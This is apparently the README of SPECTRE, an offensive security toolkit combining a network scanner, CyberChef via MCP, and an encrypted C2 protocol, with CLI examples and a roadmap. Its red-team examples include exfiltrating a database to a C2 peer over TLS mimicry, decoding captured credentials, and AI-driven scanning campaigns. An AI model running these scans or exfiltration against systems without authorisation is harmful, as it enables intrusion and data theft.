# SPECTRE

**S**ecurity **P**latform for **E**ncrypted **C**omms, **T**esting, **E**numeration, **R**econ

A unified offensive security toolkit combining wire-speed secure communications, high-performance network reconnaissance, and advanced data analysis into a cohesive operational platform with four interaction modes: CLI, TUI, GUI, and MCP Server.

<!-- markdownlint-disable no-inline-html -->
<p align="center">
  <img src="images/spectre-round-patch.png" alt="SPECTRE Platform" width="450">
</p>

<p align="center">
  <a href="https://github.com/doublegate/SPECTRE"><img src="https://img.shields.io/github/stars/doublegate/SPECTRE?style=flat-square" alt="GitHub Stars"></a>
  <a href="https://github.com/doublegate/SPECTRE/fork"><img src="https://img.shields.io/github/forks/doublegate/SPECTRE?style=flat-square" alt="GitHub Forks"></a>
  <a href="https://github.com/doublegate/SPECTRE/actions/workflows/ci.yml"><img src="https://github.com/doublegate/SPECTRE/actions/workflows/ci.yml/badge.svg" alt="CI Status"></a>
  <a href="https://github.com/doublegate/SPECTRE/releases"><img src="https://img.shields.io/badge/version-0.1.0-blue.svg" alt="Version"></a>
  <a href="https://www.rust-lang.org/"><img src="https://img.shields.io/badge/rust-1.88%2B-orange.svg" alt="Rust"></a>
  <a href="https://nodejs.org/"><img src="https://img.shields.io/badge/node-22%2B-green.svg" alt="Node.js"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT%2FGPLv3%2FApache--2.0-green.svg" alt="License"></a>
</p>
<!-- markdownlint-enable no-inline-html -->

---

## Overview

**SPECTRE** is an integrated security operations platform that orchestrates three battle-tested tools into a unified workflow for authorized security testing, red team operations, and threat research.

Each component is a standalone, production-ready project — SPECTRE provides the orchestration layer that binds them into a cohesive operational platform, delivering capabilities far greater than the sum of its parts:

| Component | Role | Capability | Version | Tests |
|-----------|------|------------|---------|-------|
| [**WRAITH-Protocol**](https://github.com/doublegate/WRAITH-Protocol) | **Encrypted Comms** | Wire-speed secure file transfer, E2EE messaging, C2 infrastructure | v2.3.7 | 2,957 |
| [**ProRT-IP**](https://github.com/doublegate/ProRT-IP) | **Enumeration & Recon** | 10M+ pps network scanning, service detection, OS fingerprinting | v1.0.0 | 2,557 |
| [**CyberChef-MCP**](https://github.com/doublegate/CyberChef-MCP) | **Testing & Analysis** | 463 data manipulation operations, AI-powered via MCP | v1.8.0 | 563 |

### Why SPECTRE?

Modern offensive security requires seamless tool integration. SPECTRE eliminates context-switching:

- **Discover** targets with ProRT-IP's high-speed reconnaissance (10M+ pps)
- **Analyze** captured data with CyberChef's 463 operations via AI-assisted workflows
- **Exfiltrate** securely via WRAITH's traffic-obfuscated channels (10+ Gbps)
- **Coordinate** red team operations through unified orchestration with campaign management
- **Automate** complex workflows with inter-component data pipelines

### Platform Metrics

| Metric | Value |
|--------|-------|
| **Combined Tests** | 6,163 (SPECTRE: 86 + WRAITH: 2,957 + ProRT-IP: 2,557 + CyberChef: 563) |
| **SPECTRE Codebase** | ~7,600 lines Rust (32 source files across 5 crates) |
| **Component Code** | ~180,000 (Rust) + ~40,000 (TypeScript/JavaScript) |
| **Languages** | Rust 2024, TypeScript, JavaScript |
| **Network Throughput** | 10+ Gbps (WRAITH), 10M+ pps (ProRT-IP) |
| **Data Operations** | 463 via CyberChef MCP |
| **Interface Modes** | CLI (implemented), TUI, GUI, MCP Server |
| **Platforms** | Linux, Windows, macOS, Docker |

---

## Interface Modes

SPECTRE provides four distinct interaction methods to suit different operational contexts:

```text
┌────────────────────────────────────────────────────────────────────┐
│                        SPECTRE INTERFACE MODES                     │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐   │
│   │   CLI    │  │   TUI    │  │   GUI    │  │    MCP Server    │   │
│   │ spectre  │  │ spectre  │  │ spectre  │  │ spectre-mcp      │   │
│   │   cmd    │  │   --tui  │  │   --gui  │  │                  │   │
│   ├──────────┤  ├──────────┤  ├──────────┤  ├──────────────────┤   │
│   │ Scripts  │  │ Real-    │  │ Visual   │  │ AI-Assisted      │   │
│   │ Pipelines│  │ time     │  │ Campaign │  │ Natural Language │   │
│   │ Automated│  │ Dashboard│  │ Planning │  │ Claude/Cursor    │   │
│   └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘   │
│        │             │             │                 │             │
│        └─────────────┴─────────────┴─────────────────┘             │
│                              │                                     │
│                    ┌─────────▼─────────┐                           │
│                    │  SPECTRE Core     │                           │
│                    │  Orchestrator     │                           │
│                    └─────────┬─────────┘                           │
│                              │                                     │
│        ┌─────────────────────┼─────────────────────┐               │
│        ▼                     ▼                     ▼               │
│   ┌─────────┐          ┌─────────┐          ┌─────────┐            │
│   │ProRT-IP │          │CyberChef│          │ WRAITH  │            │
│   │ WarScan │          │   MCP   │          │Protocol │            │
│   └─────────┘          └─────────┘          └─────────┘            │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### CLI — Command Line Interface

**Primary interface for scripting, automation, and CI/CD integration.**

```bash
# Unified command interface with subcommand routing
spectre scan -sS -p 1-1000 192.168.1.0/24        # ProRT-IP scanning
spectre chef "From_Base64,Gunzip" --input data   # CyberChef analysis
spectre send file.db --peer c2-server --encrypt  # WRAITH transfer
spectre campaign run red-team-op.yaml            # Full workflow

# Pipeline support for complex operations
spectre scan --output json 10.0.0.0/24 | \
  spectre chef "Extract_URLs,Defang_URL" | \
  spectre report --format markdown
```

**Features:**
- Nmap-compatible syntax for ProRT-IP operations
- Recipe-based CyberChef workflows
- Pipeline composition with JSON/Protocol Buffers
- Campaign definition via YAML
- Shell completion (bash, zsh, fish, PowerShell)

### TUI — Terminal User Interface

**Real-time operational dashboard leveraging ProRT-IP's 60 FPS TUI framework.**

```bash
spectre --tui                    # Launch full TUI dashboard
spectre scan --tui 192.168.1.0/24  # Scan with live visualization
```

**Dashboard Panels:**

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│ SPECTRE v0.1.0 - Operation BLACKOUT               [Campaign: red-team-01]   │
├────────────────────────────────┬────────────────────────────────────────────┤
│ RECON STATUS                   │ ANALYSIS PIPELINE                          │
│ ┌────────────────────────────┐ │ ┌────────────────────────────────────────┐ │
│ │ Targets:  254/254 ████████ │ │ │ Input:   banners.txt (2.4 MB)          │ │
│ │ Ports:    1000   ████░░░░░ │ │ │ Recipe:  [Base64→Gunzip→JSON]          │ │
│ │ Services: 47 identified    │ │ │ Status:  Processing... 67%             │ │
│ │ Rate:     45,231 pps       │ │ │ Output:  decoded_payloads.json         │ │
│ └────────────────────────────┘ │ └────────────────────────────────────────┘ │
├────────────────────────────────┼────────────────────────────────────────────┤
│ COMMS STATUS                   │ CAMPAIGN TIMELINE                          │
│ ┌────────────────────────────┐ │ ┌────────────────────────────────────────┐ │
│ │ Channel:  TLS-mimicry      │ │ │ 14:00 ▶ Recon started                  │ │
│ │ Peer:     c2.operator.net  │ │ │ 14:15   47 services discovered         │ │
│ │ Latency:  23ms             │ │ │ 14:22   Analysis complete              │ │
│ │ Tx/Rx:    1.2GB / 45MB     │ │ │ 14:30   Exfil initiated                │ │
│ └────────────────────────────┘ │ └────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────────────────────┤
│ [F1] Help  [F2] Scan  [F3] Analyze  [F4] Comms  [F5] Report  [q] Quit       │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Features:**
- 60 FPS rendering (borrowed from ProRT-IP's production TUI)
- Multi-pane layout: Recon, Analysis, Comms, Campaign status
- Real-time scan visualization with network graph
- Keyboard shortcuts for rapid operation
- Theme customization (dark/light/tactical)

### GUI — Graphical User Interface

**Web-based visual interface for campaign planning and collaboration.**

```bash
spectre --gui                    # Launch GUI server (default: localhost:8080)
spectre --gui --bind 0.0.0.0:443 # Expose for team access (with TLS)
```

**Capabilities:**
- Campaign planning workspace with drag-and-drop workflow builder
- Network topology visualization from scan results
- Real-time collaboration for multi-operator teams
- Visual recipe editor for CyberChef operations
- Report generation with exportable formats (PDF, HTML, JSON)

**Technology Stack:**
- Tauri 2.0 framework (same as WRAITH clients)
- React/TypeScript frontend
- WebSocket real-time updates
- Native system tray integration

### MCP Server — AI-Assisted Operations

**Model Context Protocol server exposing SPECTRE capabilities to AI assistants.**

```bash
spectre-mcp serve                # Start MCP server (stdio transport)
```

**Claude/Cursor Integration:**

```json
{
  "mcpServers": {
    "spectre": {
      "command": "spectre-mcp",
      "args": ["serve"]
    }
  }
}
```

**MCP Tools Exposed:**

| Tool Category | Operations | Description |
|--------------|------------|-------------|
| `spectre_scan_*` | 8 scan types | SYN, Connect, FIN, NULL, Xmas, ACK, Idle, UDP |
| `spectre_detect_*` | Service/OS | Service detection, OS fingerprinting |
| `spectre_chef_*` | 463 operations | All CyberChef operations as individual tools |
| `spectre_send/receive` | File transfer | Encrypted P2P file operations |
| `spectre_campaign_*` | Orchestration | Campaign create/run/status/abort |
| `spectre_recipe_*` | 10 tools | Recipe CRUD, export, import, test |

**AI Workflow Example:**

```
User: "Scan 192.168.1.0/24 for web servers, analyze their banners,
       and extract any base64-encoded data"

Claude: I'll create a workflow to accomplish this:
        1. spectre_scan_syn(target="192.168.1.0/24", ports="80,443,8080")
        2. spectre_detect_service(hosts=<scan_results>)
        3. spectre_chef_from_base64(input=<extracted_base64>)
```

---

## Architecture

### System Design

SPECTRE follows a modular microservices architecture where each component operates independently but communicates through well-defined interfaces:

```text
┌───────────────────────────────────────────────────────────────────────────┐
│                           SPECTRE PLATFORM                                │
├───────────────────────────────────────────────────────────────────────────┤
│  INTERFACE LAYER                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────────┐           │
│  │   CLI    │  │   TUI    │  │   GUI    │  │    MCP Server    │           │
│  │  (clap)  │  │(ratatui) │  │ (Tauri)  │  │     (stdio)      │           │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┬─────────┘           │
│       └─────────────┴─────────────┴─────────────────┘                     │
│                              │                                            │
├──────────────────────────────┼────────────────────────────────────────────┤
│  ORCHESTRATION LAYER         ▼                                            │
│  ┌─────────────────────────────────────────────────────────────────────┐  │
│  │                      SPECTRE CORE                                   │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌────────────┐  │  │
│  │  │  Campaign   │  │    Data     │  │   Workflow  │  │   Config   │  │  │
│  │  │  Manager    │  │   Router    │  │   Engine    │  │   Store    │  │  │
│  │  └─────────────┘  └─────────────┘  └─────────────┘  └────────────┘  │  │
│  └─────────────────────────────────────────────────────────────────────┘  │
│                              │                                            │
├──────────────────────────────┼────────────────────────────────────────────┤
│  COMPONENT LAYER             │                                            │
│       ┌──────────────────────┼──────────────────────┐                     │
│       ▼                      ▼                      ▼                     │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐            │
│  │    ProRT-IP     │  │  CyberChef-MCP  │  │ WRAITH-Protocol │            │
│  │    WarScan      │  │                 │  │                 │            │
│  ├─────────────────┤  ├─────────────────┤  ├─────────────────┤            │
│  │ • SYN/Connect   │  │ • 463 Ops       │  │ • E2EE Xfer     │            │
│  │ • FIN/NULL/Xmas │  │ • Encoding      │  │ • Double Ratchet│            │
│  │ • Idle/Zombie   │  │ • Crypto        │  │ • Traffic Obfsc │            │
│  │ • UDP w/Probes  │  │ • Forensics     │  │ • C2 Channel    │            │
│  │ • Svc Detection │  │ • Compression   │  │ • 12 Clients    │            │
│  │ • OS Fingerprnt │  │ • Recipe Mgmt   │  │ • RedOps        │            │
│  │ • Lua Plugins   │  │ • Batch Process │  │ • Post-Quantum  │            │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘            │
│        Rust                  Node.js              Rust                    │
│     (lib + CLI)           (Docker MCP)        (lib + 12 apps)             │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

### Data Flow

```text
┌──────────────┐     ┌───────────────┐     ┌────────────────┐     ┌───────────────┐
│    Target    │────▶│   ProRT-IP    │────▶│   CyberChef    │────▶│     WRAITH    │
│   Network    │     │     Recon     │     │    Analysis    │     │   Exfil/C2    │
└──────────────┘     └───────┬───────┘     └───────┬────────┘     └───────┬───────┘
                             │                     │                      │
                             ▼                     ▼                      ▼
                        scan.json            decoded.txt           secure_channel
                        hosts.xml            decrypted.bin         encrypted_xfer
                        services.db          forensic.log          covert_comms
                        os_info.json         patterns.json         c2_traffic

┌─────────────────────────────────────────────────────────────────────────────────┐
│                           UNIFIED DATA MODEL                                    │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
│  │   Target    │  │   Finding   │  │  Artifact   │  │      Campaign           │ │
│  │  • IP/CIDR  │  │  • Port     │  │  • File     │  │  • State machine        │ │
│  │  • Hostname │  │  • Service  │  │  • Data     │  │  • Phase tracking       │ │
│  │  • OS info  │  │  • Vuln     │  │  • Evidence │  │  • Timeline             │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └─────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────────────────┘
```

### Integration Layers

| Layer | Purpose | Technology | Status |
|-------|---------|------------|--------|
| **CLI Orchestrator** | Unified command interface | Rust (clap 4) | **Implemented** |
| **Core Library** | Configuration, scanning, comms, analysis | Rust (tokio, serde, tracing) | **Implemented** |
| **TUI Framework** | Real-time dashboard | Rust (ratatui), ProRT-IP TUI | Planned |
| **GUI Application** | Visual campaign planning | Tauri 2.0, React, TypeScript | Planned |
| **MCP Server** | AI-assisted operations | Rust, MCP Protocol | Planned |
| **Data Pipeline** | Inter-component data flow | JSON, Protocol Buffers | Planned |
| **Plugin System** | Extensibility | Lua 5.4 (sandboxed) | Future |

---

## Components

### WRAITH-Protocol — Encrypted Communications

**W**ire-speed **R**esilient **A**uthenticated **I**nvisible **T**ransfer **H**andler

The covert communications backbone of SPECTRE, providing military-grade secure file transfer with traffic analysis resistance.

| Capability | Specification |
|------------|---------------|
| **Throughput** | 10+ Gbps with AF_XDP kernel bypass |
| **Encryption** | XChaCha20-Poly1305, Noise_XX, Double Ratchet |
| **Obfuscation** | Elligator2, protocol mimicry (TLS/WebSocket/DoH) |
| **Applications** | 12 clients (Transfer, Chat, Sync, Vault, RedOps, etc.) |
| **Post-Quantum** | Hybrid X25519 + ML-KEM-768 KEX |
| **Tests** | 2,957 passing |
| **Code** | ~141,000 lines Rust + ~36,600 lines TypeScript |

**Key Features:**
- Perfect forward secrecy via Double Ratchet
- Traffic analysis resistance (Elligator2 key encoding)
- Protocol mimicry (TLS 1.3, WebSocket, DNS-over-HTTPS)
- Red team C2 infrastructure (WRAITH-RedOps) with 97.5% MITRE ATT&CK coverage
- 12 production clients including mobile (Android/iOS)

**SPECTRE Integration Points:**
- `wraith-core` library for encrypted transport
- `wraith-ffi` for FFI bindings
- Campaign coordination via WRAITH-RedOps team server

**Repository:** [github.com/doublegate/WRAITH-Protocol](https://github.com/doublegate/WRAITH-Protocol)

---

### ProRT-IP WarScan — Enumeration & Reconnaissance

High-performance network scanner combining Masscan/ZMap speed with Nmap detection depth.

| Capability | Specification |
|------------|---------------|
| **Throughput** | 10M+ packets/second (stateless), 72K+ pps (verified) |
| **Scan Types** | SYN, Connect, FIN, NULL, Xmas, ACK, Idle, UDP |
| **Detection** | Service detection (85-90%), OS fingerprinting (2,600+ sigs) |
| **Evasion** | Fragmentation, TTL, decoys, timing templates (T0-T5) |
| **IPv6** | Full dual-stack support across all scan types |
| **TUI** | 60 FPS production dashboard, 11 widgets |
| **Tests** | 2,557 passing, 51.40% coverage |

**Key Features:**
- Nmap-compatible CLI syntax (`-sS`, `-sV`, `-O`, `-A`)
- Lua 5.4 plugin system for custom detection
- PCAPNG packet capture
- O(N) connection tracking (50-1000x speedup)
- NUMA-optimized for multi-socket systems

**SPECTRE Integration Points:**
- TUI framework reuse for SPECTRE dashboard
- Scan result JSON/XML output to data pipeline
- Plugin system extensible for SPECTRE workflows

**Repository:** [github.com/doublegate/ProRT-IP](https://github.com/doublegate/ProRT-IP)

---

### CyberChef-MCP — Testing & Analysis

MCP server exposing CyberChef's 463 operations as AI-callable tools for data manipulation, cryptanalysis, and forensic analysis.

| Capability | Specification |
|------------|---------------|
| **Operations** | 463 data manipulation tools |
| **Interface** | Model Context Protocol (MCP), stdio transport |
| **Categories** | Encoding, encryption, compression, forensics |
| **Deployment** | Docker (Chainguard distroless, ~90MB) |
| **Recipe Mgmt** | 10 tools for workflow save/reuse |
| **Batch Processing** | Parallel execution up to 100 operations |
| **Tests** | 563 passing, 74.97% coverage |

**Key Features:**
- AI-native via MCP (works with Claude, Cursor, etc.)
- Recipe management with CRUD, import/export (JSON/YAML/URL)
- Batch processing (parallel/sequential execution)
- Zero-CVE Chainguard base image
- SLSA Build Level 3 provenance

**MCP Tools:**
- `cyberchef_bake` — Execute full recipes
- `cyberchef_search` — Discover operations
- 463 individual operation tools (`cyberchef_to_base64`, `cyberchef_aes_decrypt`, etc.)
- 10 recipe management tools
- 5 advanced feature tools (batch, cache, telemetry, quota)

**SPECTRE Integration Points:**
- Direct MCP bridge for AI-assisted analysis
- Recipe library for common security workflows
- Batch processing for bulk data operations

**Repository:** [github.com/doublegate/CyberChef-MCP](https://github.com/doublegate/CyberChef-MCP)

---

## Use Cases

### Red Team Operations

```bash
# 1. Reconnaissance: Enumerate target network
spectre scan -sS -sV --top-ports 1000 10.0.0.0/24 -oJ recon.json

# 2. Analysis: Decode captured credentials
spectre chef --recipe "From_Base64,URL_Decode,Gunzip" --input creds.txt

# 3. Exfiltration: Secure data extraction via covert channel
spectre send --file sensitive.db --peer operator-c2 --mimicry tls

# 4. Campaign Orchestration: Full automated workflow
spectre campaign run red-team-op.yaml --target enterprise-network
```

### Threat Research

```bash
# Capture traffic, analyze protocols, identify patterns
spectre scan --capture pcap -p 443 10.0.0.0/24 | \
  spectre chef "Extract_URLs,Defang_URL,Unique" | \
  spectre report --format json --output indicators.json

# TUI mode for live analysis
spectre --tui threat-hunt --interface eth0
```

### Security Auditing

```bash
# Full network assessment with automated analysis
spectre audit \
  --targets targets.txt \
  --scan-type comprehensive \
  --analyze-banners \
  --output-dir ./audit-results \
  --report-format pdf
```

### AI-Assisted Operations

```
# In Claude Code or Cursor with SPECTRE MCP enabled:

User: "Find all web servers on 192.168.1.0/24, extract TLS certificates,
       and identify any with expired or self-signed certs"

Claude: I'll execute this multi-step workflow:
        1. spectre_scan_syn(target="192.168.1.0/24", ports="443,8443")
        2. spectre_detect_tls_cert(hosts=<scan_results>)
        3. spectre_chef_parse_x509(input=<certificates>)
        4. Filter and report findings...
```

---

## Quick Start

### Prerequisites

- **Rust 1.88+** (for WRAITH, ProRT-IP, SPECTRE)
- **Node.js 22+** (for CyberChef-MCP)
- **Docker** (recommended for CyberChef-MCP deployment)
- **Linux kernel 6.2+** (recommended for AF_XDP/io_uring performance)
- **libpcap** (Linux/macOS) or **Npcap** (Windows) for raw packet access

### Installation

**Clone SPECTRE and submodules:**

```bash
git clone --recursive https://github.com/doublegate/SPECTRE.git
cd SPECTRE
```

**Build all Rust components:**

```bash
# Build SPECTRE CLI and integrated components
cargo build --release --workspace

# Grant network capabilities (instead of root)
sudo setcap cap_net_raw,cap_net_admin=eip target/release/spectre
```

**Setup CyberChef-MCP:**

```bash
# Pull pre-built container (recommended)
docker pull doublegate/cyberchef-mcp:latest

# Or build from source
cd components/cyberchef-mcp
docker build -f Dockerfile.mcp -t cyberchef-mcp .
```

**Verify installation:**

```bash
spectre --version
spectre status        # Check all component health
spectre self-test     # Run integration tests
```

### Basic Usage

```bash
# CLI: Quick port scan
spectre scan -sS -p 80,443,8080 192.168.1.0/24

# CLI: Analyze data with CyberChef
spectre chef "From_Base64" --input encoded.txt

# CLI: Secure file transfer
spectre send document.pdf --peer <peer-id> --encrypt

# TUI: Launch dashboard
spectre --tui

# GUI: Launch web interface
spectre --gui

# MCP: Start server for AI integration
spectre-mcp serve
```

---

## Development Roadmap

### Release Codenames

SPECTRE releases follow an operational codename convention:

| Version | Codename | Focus | Interface Milestone |
|---------|----------|-------|---------------------|
| v0.1.0 | **Operation BLACKOUT** | Foundation — CLI skeleton, component integration | CLI MVP |
| v0.2.0 | **Operation NIGHTFALL** | Data pipeline, scan-to-analysis automation | CLI + Data Pipeline |
| v0.3.0 | **Operation PHANTOM** | Campaign orchestration, multi-target coordination | TUI MVP |
| v0.4.0 | **Operation ECLIPSE** | AI-assisted targeting, threat intel integration | MCP Server |
| v0.5.0 | **Operation SHADOW** | Visual campaign planning, collaboration | GUI MVP |
| v1.0.0 | **Operation GENESIS** | Production release — full platform capability | All 4 Interfaces |

### Phase 1: Foundation — Operation BLACKOUT (Complete)

- [x] SPECTRE CLI skeleton with subcommand routing (9 commands, Nmap-compatible flags)
- [x] Component version detection and health checks (`spectre status`)
- [x] Unified configuration management (TOML with file discovery and env var support)
- [x] Structured logging with tracing (RUST_LOG, file output, JSON format)
- [x] ProRT-IP scanning interface (Scanner trait, port/target parsing, 8 scan types)
- [x] WRAITH comms interface (identity management, peer management, send/receive)
- [x] CyberChef MCP bridge (Docker container management, recipe execution)
- [x] Shell completion generation (bash, zsh, fish, PowerShell)
- [x] 86 unit tests passing, zero clippy warnings

### Phase 2: Integration — Operation NIGHTFALL

- [ ] Data pipeline between components (JSON/Protobuf)
- [ ] Scan-to-analysis automation
- [ ] Analysis-to-exfil workflows
- [ ] Campaign state management
- [ ] Output format standardization

### Phase 3: Orchestration — Operation PHANTOM

- [ ] TUI dashboard (leveraging ProRT-IP framework)
- [ ] Multi-target campaign coordination
- [ ] Parallel operation scheduling
- [ ] Result aggregation and reporting
- [ ] Real-time status visualization

### Phase 4: AI Integration — Operation ECLIPSE

- [ ] MCP Server implementation
- [ ] All scan types as MCP tools
- [ ] CyberChef operations passthrough
- [ ] AI-assisted target prioritization
- [ ] Natural language campaign definition

### Phase 5: Visual Interface — Operation SHADOW

- [ ] Tauri 2.0 GUI application
- [ ] Campaign planning workspace
- [ ] Network topology visualization
- [ ] Multi-operator collaboration
- [ ] Visual workflow builder

### Future Enhancements

- [ ] Plugin system for custom workflows (Lua 5.4)
- [ ] Automated vulnerability correlation
- [ ] Integration with external threat intel feeds
- [ ] Kubernetes deployment (Helm chart)
- [ ] Distributed scanning coordinator

---

## Project Structure

```text
SPECTRE/
├── Cargo.toml              # Workspace manifest
├── Cargo.lock              # Dependency lock file
├── README.md               # This file
├── CHANGELOG.md            # Version history
├── CLAUDE.md               # AI assistant guidance
├── CONTRIBUTING.md         # Contribution guidelines
├── SECURITY.md             # Security policy
├── LICENSE                 # License file
├── rustfmt.toml            # Rust formatting config
├── clippy.toml             # Rust linting config
├── .editorconfig           # Editor standards
│
├── crates/
│   ├── spectre-cli/        # Unified CLI orchestrator
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── main.rs         # Entry point, CLI parsing
│   │       ├── commands/       # Subcommand implementations
│   │       │   ├── scan.rs         # Network scanning (ProRT-IP)
│   │       │   ├── chef.rs         # Data analysis (CyberChef-MCP)
│   │       │   ├── send.rs         # Secure send (WRAITH)
│   │       │   ├── receive.rs      # Secure receive (WRAITH)
│   │       │   ├── identity.rs     # Identity management
│   │       │   ├── peer.rs         # Peer management
│   │       │   ├── status.rs       # Component health checks
│   │       │   ├── config.rs       # Configuration management
│   │       │   └── completions.rs  # Shell completion generation
│   │       └── output/         # Output formatting
│   │           ├── table.rs        # Table output (comfy-table)
│   │           └── json.rs         # JSON output (serde_json)
│   ├── spectre-core/       # Core orchestration library
│   │   ├── Cargo.toml
│   │   └── src/
│   │       ├── lib.rs          # Library root
│   │       ├── error.rs        # Error types (SpectreError)
│   │       ├── logging.rs      # Tracing setup
│   │       ├── config/         # Configuration system
│   │       │   ├── mod.rs          # Config structs (serde)
│   │       │   └── loader.rs       # File discovery, merging
│   │       ├── scan/           # Scanning interface
│   │       │   ├── mod.rs          # Module exports
│   │       │   ├── traits.rs       # Scanner trait
│   │       │   ├── types.rs        # ScanType, ScanResult, etc.
│   │       │   └── parser.rs       # Port/target parsing
│   │       ├── chef/           # CyberChef integration
│   │       │   ├── mod.rs          # Chef trait
│   │       │   ├── mcp.rs          # MCP client adapter
│   │       │   └── docker.rs       # Container management
│   │       └── comms/          # WRAITH integration
│   │           ├── mod.rs          # Module exports
│   │           ├── identity.rs     # Identity generation/storage
│   │           └── peer.rs         # Peer management
│   ├── spectre-tui/        # TUI dashboard (planned)
│   ├── spectre-gui/        # GUI application (planned)
│   └── spectre-mcp/        # MCP server (planned)
│
├── configs/
│   └── spectre.toml        # Default configuration
│
├── docs/
│   ├── architecture/       # System design documentation
│   ├── user-guide/         # Usage documentation
│   ├── integration/        # Component integration guides
│   ├── briefings/          # Mission briefing templates
│   ├── development/        # Developer documentation
│   ├── api/                # API specifications
│   ├── security/           # Security documentation
│   ├── deployment/         # Deployment guides
│   ├── tutorials/          # Step-by-step tutorials
│   └── reference/          # Reference materials
│
├── to-dos/                 # Sprint planning (7 phases)
│
├── .github/
│   ├── workflows/          # CI/CD (ci.yml, release.yml)
│   ├── ISSUE_TEMPLATE/     # Bug report, feature request
│   └── PULL_REQUEST_TEMPLATE.md
│
└── tests/                  # Integration tests (planned)
```

---

## Mission Briefing Documentation

SPECTRE documentation follows military operational formatting for clarity and familiarity. Templates are available in `docs/briefings/`.

### OPORD (Operations Order)

Standard 5-paragraph format for campaign planning — see [OPORD-template.md](docs/briefings/OPORD-template.md).

### SITREP (Situation Report)

Real-time campaign status updates — see [SITREP.md](docs/briefings/SITREP.md).

### CONOP (Concept of Operations)

Detailed operational methodology — see [CONOP-template.md](docs/briefings/CONOP-template.md).

### AAR (After Action Review)

Post-campaign analysis — see [AAR-template.md](docs/briefings/AAR-template.md).

---

## Security & Legal

### Responsible Use

> **IMPORTANT:** SPECTRE is designed for authorized security testing only.

- Only use on networks you own or have explicit written permission to test
- Unauthorized scanning and intrusion may violate laws (CFAA, CMA, etc.)
- Always obtain proper authorization and define scope before testing
- Follow your organization's rules of engagement (ROE)

### Security Features

- All communications encrypted with modern cryptography (XChaCha20-Poly1305)
- Traffic analysis resistance built-in (Elligator2, protocol mimicry)
- No telemetry or phone-home functionality
- Audit logging for compliance
- Post-quantum hybrid encryption available (X25519 + ML-KEM-768)

---

## Contributing

We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

**Component-specific guidelines:**

- [WRAITH-Protocol CONTRIBUTING.md](https://github.com/doublegate/WRAITH-Protocol/blob/main/CONTRIBUTING.md)
- [ProRT-IP CONTRIBUTING.md](https://github.com/doublegate/ProRT-IP/blob/main/CONTRIBUTING.md)
- [CyberChef-MCP CONTRIBUTING.md](https://github.com/doublegate/CyberChef-MCP/blob/main/CONTRIBUTING.md)

### Development Standards

- Rust code: `cargo fmt`, `cargo clippy -- -D warnings`
- TypeScript/JavaScript: ESLint, Prettier
- Commit messages: [Conventional Commits](https://www.conventionalcommits.org/)
- All PRs require tests and documentation
- See [SECURITY.md](SECURITY.md) for vulnerability reporting

---

## License

SPECTRE is a multi-license project reflecting its component licenses:

| Component | License |
|-----------|---------|
| SPECTRE (CLI, Core, TUI, GUI, MCP) | MIT |
| WRAITH-Protocol | MIT |
| ProRT-IP | GPLv3 |
| CyberChef-MCP | Apache 2.0 |

See individual component repositories for full license texts.

---

## Acknowledgments

SPECTRE builds on the shoulders of giants:

**Security Research:**
[Nmap](https://nmap.org/) |
[Masscan](https://github.com/robertdavidgraham/masscan) |
[Cobalt Strike](https://www.cobaltstrike.com/) |
[Sliver](https://github.com/BishopFox/sliver)

**Cryptography:**
[Noise Protocol](https://noiseprotocol.org/) |
[Signal Protocol](https://signal.org/docs/) |
[WireGuard](https://www.wireguard.com/)

**Data Analysis:**
[CyberChef](https://github.com/gchq/CyberChef) |
[Model Context Protocol](https://modelcontextprotocol.io/)

---

## Links

- **Repository:** [github.com/doublegate/SPECTRE](https://github.com/doublegate/SPECTRE)
- **Issues:** [GitHub Issues](https://github.com/doublegate/SPECTRE/issues)
- **Discussions:** [GitHub Discussions](https://github.com/doublegate/SPECTRE/discussions)

### Related Repositories

| Repository | Description |
|------------|-------------|
| [WRAITH-Protocol](https://github.com/doublegate/WRAITH-Protocol) | Secure communications component (v2.3.7) |
| [ProRT-IP](https://github.com/doublegate/ProRT-IP) | Network reconnaissance component (v1.0.0) |
| [CyberChef-MCP](https://github.com/doublegate/CyberChef-MCP) | Data analysis component (v1.8.0) |

---

**SPECTRE** — _Unified Offensive Security_

**Version:** 0.1.0 | **License:** Multi-license | **Language:** Rust + TypeScript | **Status:** Early Development

**Last Updated:** 2026-02-04
